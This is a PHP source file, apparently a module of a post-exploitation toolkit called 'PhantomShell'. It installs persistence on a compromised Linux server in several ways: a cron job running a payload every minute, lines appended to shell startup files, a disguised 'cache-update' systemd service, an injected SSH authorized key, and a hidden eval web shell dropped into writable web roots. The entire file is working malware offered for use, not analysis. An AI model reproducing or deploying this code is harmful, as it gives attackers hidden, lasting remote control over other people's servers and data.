<?php
// PhantomShell Module: Persistence
// Load via MINIMAL mode: fetch persistence

function mod_persist_cron($payload_path) {
    $cl = "* * * * * php $payload_path >/dev/null 2>&1";
    $cur = '';
    if(function_exists('shell_exec')) $cur = (string)@shell_exec('crontab -l 2>/dev/null');
    if(strpos($cur, $payload_path) !== false) return 'Already installed';
    $tmp = tempnam('/tmp', 'cr');
    file_put_contents($tmp, trim($cur) . "\n$cl\n");
    if(function_exists('shell_exec')) @shell_exec("crontab $tmp 2>&1");
    @unlink($tmp);
    return 'Cron installed';
}

function mod_persist_bashrc($payload_path) {
    $home = getenv('HOME') ?: '/root';
    $ln = "php $payload_path >/dev/null 2>&1 &";
    foreach (array('.bashrc', '.profile', '.zshrc') as $rc) {
        $f = "$home/$rc";
        if (!file_exists($f)) continue;
        $c = @file_get_contents($f);
        if ($c === false || strpos($c, $ln) !== false) continue;
        @file_put_contents($f, $c . "\n$ln\n");
    }
    return 'RC files modified';
}

function mod_persist_systemd($payload_path) {
    $body = "[Unit]\nDescription=Cache Update\nAfter=network.target\n";
    $body .= "[Service]\nExecStart=/usr/bin/php $payload_path\nRestart=always\nRestartSec=10\n";
    $body .= "[Install]\nWantedBy=multi-user.target\n";
    $p = '/etc/systemd/system/cache-update.service';
    if (@file_put_contents($p, $body) !== false) {
        if(function_exists('shell_exec')) @shell_exec('systemctl daemon-reload && systemctl enable cache-update 2>&1');
        return "Systemd: $p";
    }
    return 'Failed (need root)';
}

function mod_persist_ssh_key($key) {
    $home = getenv('HOME') ?: '/tmp';
    $sd = "$home/.ssh";
    if (!is_dir($sd)) @mkdir($sd, 0700, true);
    $af = "$sd/authorized_keys";
    $ex = (string)@file_get_contents($af);
    if (strpos($ex, $key) !== false) return 'Key already present';
    @file_put_contents($af, $ex . $key . "\n", FILE_APPEND);
    @chmod($af, 0600);
    return "Key added to $af";
}

function mod_persist_webshell($path) {
    $sh = '<?php @eval($_REQUEST["c"]);?>';
    if (!$path) {
        foreach (array('/var/www/html', '/var/www', '/srv/www') as $d) {
            if (is_dir($d) && is_writable($d)) { $path = "$d/.info.php"; break; }
        }
    }
    if (!$path) return 'No writable webroot';
    @file_put_contents($path, $sh);
    return "Webshell: $path";
}

if (isset($sock)) {
    @fwrite($sock, "  Persistence module loaded.\n");
    @fwrite($sock, "  Functions: mod_persist_cron, mod_persist_bashrc, mod_persist_systemd, mod_persist_ssh_key, mod_persist_webshell\n");
}
?>
